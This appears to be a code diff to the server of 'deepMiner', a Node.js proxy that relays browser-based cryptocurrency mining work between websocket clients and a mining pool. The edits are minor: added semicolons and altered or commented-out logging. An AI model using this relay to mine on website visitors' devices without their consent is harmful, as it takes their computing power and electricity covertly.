@@ -30,6 +30,7 @@ var web = http.createServer((req, res) => {
 		} else {
 			if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
 				buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
+				//console.warn({domain:conf.domain, url:req.url,buf:buf});
 				if (req.url.match(/\.js$/)) {
 					res.setHeader('content-type', 'application/javascript');
 				}
@@ -56,7 +57,7 @@ srv.on('connection', (ws) => {
 		accepted: 0,
 		ws: ws,
 		pl: new net.Socket(),
-	}
+	};
 	var pool = conf.pool.split(':');
 	conn.pl.connect(pool[1], pool[0]);
 
@@ -79,7 +80,7 @@ srv.on('connection', (ws) => {
 							"agent": "deepMiner"
 						},
 						"id": conn.pid
-					}
+					};
 					buf = JSON.stringify(buf) + '\n';
 					conn.pl.write(buf);
 					break;
@@ -96,7 +97,7 @@ srv.on('connection', (ws) => {
 							"result": data.params.result
 						},
 						"id": conn.pid
-					}
+					};
 					buf = JSON.stringify(buf) + '\n';
 					conn.pl.write(buf);
 					break;
@@ -117,18 +118,18 @@ srv.on('connection', (ws) => {
 						"token": "",
 						"hashes": conn.accepted
 					}
-				}
+				};
 				buf = JSON.stringify(buf);
 				conn.ws.send(buf,function(error) {
-					console.warn('[!] Error: Something wrong with websocket buffer. `type: authed`');
+					//console.log({authed: conn.accepted, error:error});
 				});
 				buf = {
 					"type": "job",
 					"params": data.result.job
-				}
+				};
 				buf = JSON.stringify(buf);
 				conn.ws.send(buf,function(error) {
-					console.warn('[!] Error: Something wrong with websocket buffer. `type: job` (with authed)');
+					//console.log({job_with_authed: data.result.job, error:error});
 				});
 			} else if (data.result.status === 'OK') {
 				conn.accepted++;
@@ -137,10 +138,10 @@ srv.on('connection', (ws) => {
 					"params": {
 						"hashes": conn.accepted
 					}
-				}
+				};
 				buf = JSON.stringify(buf);
 				conn.ws.send(buf,function(error) {
-					console.warn('[!] Error: Something wrong with websocket buffer. `type: hash_accepted`');
+					//console.log({hash_accepted: conn.accepted, error:error});
 				});
 			}
 		}
@@ -162,23 +163,23 @@ srv.on('connection', (ws) => {
 			}
 			buf = JSON.stringify(buf);
 			conn.ws.send(buf,function(error) {
-				console.warn('[!] Error: Something wrong with websocket buffer. `type: error`');
+				console.error({error:error, buffer: buf});
 			});
 		}
 		if (data.method === 'job') {
 			buf = {
 				"type": 'job',
 				"params": data.params
-			}
+			};
 			buf = JSON.stringify(buf);
 			conn.ws.send(buf,function(error) {
-				console.warn('[!] Error: Something wrong with websocket buffer. `type: job`');
+				//console.log({job: data.params, error:error});
 			});
 		}
 	}
 	conn.ws.on('message', (data) => {
 		ws2pool(data);
-		console.log('[>] Request: ' + conn.uid + '\n\n' + data + '\n');
+		console.log('[>] Request: ' + conn.uid + '\n' + data + '\n');
 	});
 	conn.ws.on('error', (data) => {
 		console.log('[!] ' + conn.uid + ' WebSocket ' + data + '\n');
@@ -190,7 +191,7 @@ srv.on('connection', (ws) => {
 	});
 	conn.pl.on('data', (data) => {
 		pool2ws(data);
-		console.log('[<] Response: ' + conn.uid + '\n\n' + data + '\n');
+		console.log('[<] Response: ' + conn.uid + '\n' + data + '\n');
 	});
 	conn.pl.on('error', (data) => {
 		console.log('PoolSocket ' + data + '\n');
